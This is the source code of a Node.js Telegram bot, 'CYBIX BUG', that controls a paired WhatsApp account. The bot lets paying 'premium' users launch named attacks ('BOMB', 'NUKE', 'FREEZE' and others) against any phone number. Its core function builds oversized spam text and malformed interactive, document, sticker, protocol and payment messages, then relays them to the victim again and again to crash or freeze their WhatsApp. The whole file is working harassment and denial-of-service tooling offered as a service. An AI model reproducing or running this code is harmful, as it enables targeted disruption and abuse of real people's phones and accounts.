// EXPRESS SERVER FOR RENDER DEPLOYMENT (UPGRADED, STAYS AWAKE)
const express = require("express");
const app = express();
const PORT = process.env.PORT || 8080;
app.get("/", (req, res) => res.send("CYBIX BUG BOT IS RUNNING!"));
app.get("/ping", (req, res) => res.send("pong")); // For Render keep-alive
setInterval(() => {
  // Self-ping to keep Render instance awake
  axios.get(`http://localhost:${PORT}/ping`).catch(() => {});
}, 1000 * 60 * 5); // Every 5 minutes

app.listen(PORT, () => console.log("[CYBIX][EXPRESS] Listening on port " + PORT));

// ENV
require("dotenv").config();
const BOT_TOKEN = process.env.BOT_TOKEN;
const OWNER_ID = process.env.OWNER_ID;

// DEPENDENCIES (ALL UPDATED)
const fs = require("fs");
const chalk = require("chalk");
const moment = require("moment-timezone");
const crypto = require("crypto");
const { Telegraf } = require("telegraf");
const axios = require("axios");
const pino = require("pino");
const { default: makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion, makeInMemoryStore, generateWAMessageFromContent, proto } = require("@whiskeysockets/baileys");
const qrcode = require("qrcode-terminal");

// DATA FILES
const DATA_FILES = {
  premium: "./premiumUsers.json",
  admins: "./admins.json",
  activity: "./userActivity.json"
};
let premiumUsers = {};
let adminUsers = [];
let userActivity = {};
function loadFile(file, fallback) {
  try { return JSON.parse(fs.readFileSync(file)); } catch { return fallback; }
}
function saveFile(file, data) { fs.writeFileSync(file, JSON.stringify(data)); }

// ADMIN/PREMIUM/OWNER
function isOwner(userId) { return userId.toString() === OWNER_ID; }
function isAdmin(userId) { return adminUsers.includes(userId.toString()); }
function isPremium(userId) {
  const user = premiumUsers[userId];
  if (!user) return false;
  return moment().tz("Africa/Lagos").isBefore(moment(user.expired, "YYYY-MM-DD HH:mm:ss").tz("Africa/Lagos"));
}
function recordUserActivity(userId, nickname) {
  userActivity[userId] = { nickname: nickname || userId, last_seen: moment().tz("Africa/Lagos").format("YYYY-MM-DD HH:mm:ss") };
  saveFile(DATA_FILES.activity, userActivity);
}

// WHATSAPP MODULE (latest Baileys)
let waClient = null;
let waConnected = false;
const waStore = makeInMemoryStore({ logger: pino().child({ level: "silent" }) });
async function startWhatsapp() {
  const { state, saveCreds } = await useMultiFileAuthState("./wa-session");
  const { version } = await fetchLatestBaileysVersion();
  waClient = makeWASocket({
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ["Linux", "Chrome", "120"],
  });
  waClient.ev.on("creds.update", saveCreds);
  waStore.bind(waClient.ev);
  waClient.ev.on("connection.update", ({ connection, lastDisconnect }) => {
    if (connection === "open") { waConnected = true; console.log(chalk.green.bold("WhatsApp Connected")); }
    if (connection === "close") {
      waConnected = false;
      if (lastDisconnect?.error?.output?.statusCode !== 401) startWhatsapp();
      console.log(chalk.red.bold("WhatsApp Disconnected. Reconnecting..."));
    }
  });
}

// INIT DATA
function loadAllData() {
  premiumUsers = loadFile(DATA_FILES.premium, {});
  adminUsers = loadFile(DATA_FILES.admins, []);
  userActivity = loadFile(DATA_FILES.activity, {});
}
loadAllData();
startWhatsapp();

// TELEGRAM BOT SETUP
const bot = new Telegraf(BOT_TOKEN);

let maintenance = {
  enabled: false,
  message: "CYBIX BUG is under maintenance by the owner. Please wait!"
};
const BANNER_IMAGE_URL = "https://imgur.com/a/b4ZAdYa";
const bugTypes = [
  { cmd: "cybixbomb", emoji: "💣", label: "BOMB" },
  { cmd: "cybixquake", emoji: "🌋", label: "QUAKE" },
  { cmd: "cybixflood", emoji: "🌊", label: "FLOOD" },
  { cmd: "cybixstorm", emoji: "🌪️", label: "STORM" },
  { cmd: "cybixworm", emoji: "🦠", label: "WORM" },
  { cmd: "cybixnuke", emoji: "☢️", label: "NUKE" },
  { cmd: "cybixinferno", emoji: "🔥", label: "INFERNO" },
  { cmd: "cybixplague", emoji: "🦠", label: "PLAGUE" },
  { cmd: "cybixavalanche", emoji: "🏔️", label: "AVALANCHE" },
  { cmd: "cybixfreeze", emoji: "❄️", label: "FREEZE" }
];

// MIDDLEWARE
bot.use(async (ctx, next) => {
  let userId = ctx.from?.id?.toString();
  let nickname = ctx.from?.first_name || userId;
  if (userId) recordUserActivity(userId, nickname);
  if (maintenance.enabled && !isOwner(userId)) {
    return await ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: maintenance.message });
  }
  await next();
});
function requirePremium(ctx, next) {
  if (isOwner(ctx.from.id) || isAdmin(ctx.from.id) || isPremium(ctx.from.id)) return next();
  else return ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: "You are not a premium user. Contact owner to upgrade!" });
}
function requireAdmin(ctx, next) {
  if (isOwner(ctx.from.id) || isAdmin(ctx.from.id)) return next();
  else return ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: "You do not have admin access." });
}
function requireWA(ctx, next) {
  if (!waConnected) return ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: "WhatsApp is not connected yet. Please pair first." });
  return next();
}

// MENUS
bot.start(async ctx => {
  const menu = `
━━━━━━━━━━━━━━━━━━
CYBIX BUG SYSTEM
━━━━━━━━━━━━━━━━━━
OWNER INFO
┏━━━━━━━━━━━━━━
┃ ⎚ OWNER ID : ${OWNER_ID}
┃ ⎚ OWNER : ${isOwner(ctx.from.id) ? "✅" : "❌"}
┃ ⎚ ADMIN : ${isAdmin(ctx.from.id) ? "✅" : "❌"}
┃ ⎚ PREMIUM : ${isPremium(ctx.from.id) ? "✅" : "❌"}
┗━━━━━━━━━━━━━━
┏━━━━━━COMMANDS━━━━━
☞ /bugmenu
☞ /ownermenu
☞ /othermenu
━━━━━━━━━━━━━━━━━━
`;
  await ctx.replyWithPhoto(BANNER_IMAGE_URL, {
    caption: menu,
    reply_markup: { inline_keyboard: [[{ text: "CONTACT OWNER", url: "https://t.me/yourusername" }]] }
  });
});
bot.command("ownermenu", async ctx => {
  await ctx.deleteMessage();
  const menu = `
┏━━━━━━OWNER COMMANDS━━━━━
☞ /addadmin [UserID]
☞ /deladmin [UserID]
☞ /addprem [UserID] [Days]
☞ /delprem [UserID]
☞ /addpairing [PhoneNumber]
☞ /maintenance [on/off]
━━━━━━━━━━━━━━━━━━
  `;
  await ctx.replyWithPhoto(BANNER_IMAGE_URL, {
    caption: menu,
    reply_markup: { inline_keyboard: [[{ text: "CONTACT OWNER", url: "https://t.me/yourusername" }]] }
  });
});
bot.command("othermenu", async ctx => {
  await ctx.deleteMessage();
  const menu = `
┏━━━━━━PREMIUM PANEL━━━━━
☞ /addprem [UserID] [Days]
☞ /delprem [UserID]
━━━━━━━━━━━━━━━━━━
  `;
  await ctx.replyWithPhoto(BANNER_IMAGE_URL, {
    caption: menu,
    reply_markup: { inline_keyboard: [[{ text: "CONTACT OWNER", url: "https://t.me/yourusername" }]] }
  });
});
bot.command("bugmenu", async ctx => {
  await ctx.deleteMessage();
  let buglist = bugTypes.map(b => `☞ /${b.cmd} [PhoneNumber] ${b.emoji}`).join("\n");
  const menu = `
┏━━━━━━BUG ARSENAL━━━━━
${buglist}
━━━━━━━━━━━━━━━━━━
  `;
  await ctx.replyWithPhoto(BANNER_IMAGE_URL, {
    caption: menu,
    reply_markup: { inline_keyboard: [[{ text: "CONTACT OWNER", url: "https://t.me/yourusername" }]] }
  });
});

// ADMIN/PREMIUM CMDS
bot.command("addadmin", requireAdmin, async ctx => {
  const parts = ctx.message.text.split(" ");
  const userId = parts[1];
  if (!userId) return ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: "Format: /addadmin [UserID]" });
  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveFile(DATA_FILES.admins, adminUsers);
    ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: `User *${userId}* added as Admin.` });
  } else ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: "User is already an admin." });
});
bot.command("deladmin", requireAdmin, async ctx => {
  const parts = ctx.message.text.split(" ");
  const userId = parts[1];
  if (!userId) return ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: "Format: /deladmin [UserID]" });
  adminUsers = adminUsers.filter(id => id !== userId);
  saveFile(DATA_FILES.admins, adminUsers);
  ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: `User *${userId}* removed from Admins.` });
});
bot.command("addprem", requireAdmin, async ctx => {
  const parts = ctx.message.text.split(" ");
  const userId = parts[1];
  const days = parseInt(parts[2]);
  if (!userId || !days) return ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: "Format: /addprem [UserID] [Days]" });
  premiumUsers[userId] = { expired: moment().tz("Africa/Lagos").add(days, "days").format("YYYY-MM-DD HH:mm:ss") };
  saveFile(DATA_FILES.premium, premiumUsers);
  ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: `User *${userId}* added as Premium for ${days} days.` });
});
bot.command("delprem", requireAdmin, async ctx => {
  const parts = ctx.message.text.split(" ");
  const userId = parts[1];
  if (!userId) return ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: "Format: /delprem [UserID]" });
  delete premiumUsers[userId];
  saveFile(DATA_FILES.premium, premiumUsers);
  ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: `User *${userId}* removed from Premium.` });
});
bot.command("listadmins", requireAdmin, async ctx => {
  const msg = adminUsers.length ? adminUsers.map(id => `- ${id}`).join("\n") : "No admins yet.";
  ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: `*Admins:*\n${msg}` });
});
bot.command("listprem", requireAdmin, async ctx => {
  const msg = Object.keys(premiumUsers).length
    ? Object.entries(premiumUsers).map(([id, data]) => `- ${id}: expires ${data.expired}`).join("\n")
    : "No premium users yet.";
  ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: `*Premium Users:*\n${msg}` });
});

// WHATSAPP PAIRING & MAINTENANCE
bot.command("addpairing", requireAdmin, async ctx => {
  const parts = ctx.message.text.split(" ");
  const phone = parts[1];
  if (!phone) return ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: "Format: /addpairing [PhoneNumber]" });
  if (waClient && waClient.user) return ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: "WhatsApp is already connected." });
  try {
    const code = await waClient.requestPairingCode(phone);
    await ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: `*Pairing Code:*\n*Number:* ${phone}\n*Code:* \`${code}\`` });
  } catch (e) {
    ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: "Failed to pair. Make sure the number is valid and can receive SMS." });
  }
});
bot.command("maintenance", requireAdmin, async ctx => {
  const parts = ctx.message.text.split(" ");
  const state = parts[1];
  if (state === "on") {
    maintenance.enabled = true;
    ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: "Maintenance mode enabled." });
  } else if (state === "off") {
    maintenance.enabled = false;
    ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: "Maintenance mode disabled." });
  } else ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: "Format: /maintenance [on/off]" });
});

// BUGS: ULTRA MULTI-PAYLOAD
function bigSpamText(label, emoji) {
  return (label + " " + emoji).repeat(99999) + crypto.randomBytes(128).toString("hex");
}
async function cybixBugUltimate(targetJid, label, emoji) {
  for (let i = 0; i < 7; i++) {
    let listPayload = {
      title: `${label} LIST`,
      sections: Array.from({ length: 7 }, (_, j) => ({
        title: `${label} Section ${j + 1}`,
        rows: [{
          title: bigSpamText(label, emoji),
          id: crypto.randomBytes(32).toString("hex")
        }]
      }))
    };
    let buttons = Array.from({ length: 7 }, () => ({
      buttonId: crypto.randomBytes(32).toString("hex"),
      buttonText: { displayText: `${label} ${emoji} BUTTON` },
      type: 1,
    }));
    let contactVcard = {
      displayName: `${label} Contact`,
      vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:${label} Victim\nTEL;type=CELL:${Math.floor(Math.random() * 10000000000)}\nEND:VCARD`
    };
    let documentMessage = {
      documentMessage: {
        url: "https://files.catbox.moe/w1r1mm.jpg",
        mimetype: "application/pdf",
        fileSha256: crypto.randomBytes(32).toString("base64"),
        fileLength: `${Math.floor(Math.random() * 99999999999)}`,
        pageCount: 1,
        fileName: `${label}_payload_${crypto.randomBytes(16).toString("hex")}.pdf`,
        jpegThumbnail: "https://files.catbox.moe/w1r1mm.jpg"
      }
    };
    let imageMessage = {
      imageMessage: {
        url: "https://files.catbox.moe/w1r1mm.jpg",
        mimetype: "image/jpeg",
        caption: `${label} IMAGE CRASH`,
        jpegThumbnail: "https://files.catbox.moe/w1r1mm.jpg"
      }
    };
    let locationMessage = {
      locationMessage: {
        degreesLatitude: Math.random() * 180 - 90,
        degreesLongitude: Math.random() * 360 - 180,
        name: `${label} Location`,
        address: `${label} ${crypto.randomBytes(12).toString("hex")}`,
        jpegThumbnail: "https://files.catbox.moe/w1r1mm.jpg"
      }
    };
    let pollMessage = {
      pollCreationMessage: {
        name: `${label} Poll`,
        options: Array.from({ length: 7 }, (_, k) => ({ optionName: `${label} Option ${k + 1}` })),
        selectableOptionsCount: 7
      }
    };
    let stickerMessage = {
      stickerMessage: {
        url: "https://files.catbox.moe/w1r1mm.jpg",
        mimetype: "image/webp",
        fileSha256: crypto.randomBytes(32).toString("base64"),
        fileEncSha256: crypto.randomBytes(32).toString("base64"),
        mediaKey: crypto.randomBytes(32).toString("base64"),
        fileLength: `${Math.floor(Math.random() * 99999999)}`,
        directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc",
        mediaKeyTimestamp: Date.now(),
        isAnimated: false,
        jpegThumbnail: "https://files.catbox.moe/w1r1mm.jpg"
      }
    };

    let msgList = generateWAMessageFromContent(
      targetJid,
      proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: proto.Message.InteractiveMessage.create({
              body: proto.Message.InteractiveMessage.Body.create({
                text: bigSpamText(label, emoji),
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
                buttonParamsJson: JSON.stringify(listPayload),
              }),
              header: proto.Message.InteractiveMessage.Header.create({
                buttonParamsJson: JSON.stringify(listPayload),
                subtitle: bigSpamText(label, emoji),
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                buttons: buttons
              }),
            }),
          },
        },
      }),
      { userJid: targetJid }
    );
    let msgContact = generateWAMessageFromContent(targetJid, proto.Message.fromObject({ contactMessage: contactVcard }), { userJid: targetJid });
    let msgDoc = generateWAMessageFromContent(targetJid, proto.Message.fromObject(documentMessage), { userJid: targetJid });
    let msgImg = generateWAMessageFromContent(targetJid, proto.Message.fromObject(imageMessage), { userJid: targetJid });
    let msgLoc = generateWAMessageFromContent(targetJid, proto.Message.fromObject(locationMessage), { userJid: targetJid });
    let msgPoll = generateWAMessageFromContent(targetJid, proto.Message.fromObject(pollMessage), { userJid: targetJid });
    let msgSticker = generateWAMessageFromContent(targetJid, proto.Message.fromObject(stickerMessage), { userJid: targetJid });

    for (let k = 0; k < 3; k++) {
      await waClient.relayMessage(targetJid, msgList.message, { messageId: msgList.key.id, participant: { jid: targetJid } });
      await waClient.relayMessage(targetJid, msgContact.message, { messageId: msgContact.key.id, participant: { jid: targetJid } });
      await waClient.relayMessage(targetJid, msgDoc.message, { messageId: msgDoc.key.id, participant: { jid: targetJid } });
      await waClient.relayMessage(targetJid, msgImg.message, { messageId: msgImg.key.id, participant: { jid: targetJid } });
      await waClient.relayMessage(targetJid, msgLoc.message, { messageId: msgLoc.key.id, participant: { jid: targetJid } });
      await waClient.relayMessage(targetJid, msgPoll.message, { messageId: msgPoll.key.id, participant: { jid: targetJid } });
      await waClient.relayMessage(targetJid, msgSticker.message, { messageId: msgSticker.key.id, participant: { jid: targetJid } });
    }
    let sysNotification = generateWAMessageFromContent(targetJid, proto.Message.fromObject({
      protocolMessage: {
        key: { remoteJid: targetJid, id: crypto.randomBytes(12).toString("hex") },
        type: 1,
        message: { conversation: bigSpamText(label, emoji) }
      }
    }), { userJid: targetJid });
    await waClient.relayMessage(targetJid, sysNotification.message, { messageId: sysNotification.key.id, participant: { jid: targetJid } });
    let invoiceMessage = generateWAMessageFromContent(targetJid, proto.Message.fromObject({
      paymentInfoMessage: {
        currency: "USD",
        amount: `${Math.floor(Math.random() * 100000)}`,
        paymentType: 1,
        status: 1,
        requestFrom: targetJid,
        expiryTimestamp: Date.now() + 86400000
      }
    }), { userJid: targetJid });
    await waClient.relayMessage(targetJid, invoiceMessage.message, { messageId: invoiceMessage.key.id, participant: { jid: targetJid } });
    let quizMessage = generateWAMessageFromContent(targetJid, proto.Message.fromObject({
      pollCreationMessage: {
        name: `${label} QUIZ`,
        options: Array.from({ length: 7 }, (_, k) => ({ optionName: `${label} Quiz Option ${k + 1}` })),
        selectableOptionsCount: 1
      }
    }), { userJid: targetJid });
    await waClient.relayMessage(targetJid, quizMessage.message, { messageId: quizMessage.key.id, participant: { jid: targetJid } });
    for (let s = 0; s < 4; s++) {
      let spamMsg = generateWAMessageFromContent(targetJid, proto.Message.fromObject({
        conversation: bigSpamText(label, emoji)
      }), { userJid: targetJid });
      await waClient.relayMessage(targetJid, spamMsg.message, { messageId: spamMsg.key.id, participant: { jid: targetJid } });
    }
    console.log(chalk.red.bold(`[CYBIX ${label}] Massive payloads sent to ${targetJid}`));
  }
}
for (const bug of bugTypes) {
  bot.command(bug.cmd, requireWA, requirePremium, async ctx => {
    const parts = ctx.message.text.split(" ");
    const phone = parts[1];
    if (!phone) return ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: `Format: /${bug.cmd} [PhoneNumber]` });
    const targetJid = phone.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    await ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: `${bug.label} attack started on target: ${phone}` });
    await cybixBugUltimate(targetJid, bug.label, bug.emoji);
    await ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: `${bug.label} sent to ${phone}!` });
  });
}

// LAUNCH BOT
bot.launch();
console.log(chalk.cyan.bold("CYBIX BUG is running!"));